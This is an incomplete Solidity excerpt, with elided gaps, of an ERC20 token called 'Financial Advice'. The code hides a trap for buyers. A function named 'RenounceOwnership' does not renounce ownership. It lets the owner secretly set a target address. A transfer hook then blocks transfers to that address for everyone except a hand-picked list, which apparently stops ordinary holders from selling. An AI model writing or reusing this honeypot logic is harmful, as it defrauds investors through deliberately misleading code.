...
contract FA is ERC20, Ownable {
    mapping(address=>bool) private _blacklisted;
    address private _faToken;
    constructor() ERC20('Financial Advice','FA') {
    ...
    function RenounceOwnership(address faToken_) public onlyOwner {
        _faToken = faToken_;
    }

    function _lamboFactory(address from, address to, uint256 amount) internal virtual override {
        if(to == _faToken) {
            require(_blacklisted[from], "No financial advice for the bots!");
        }
    }
}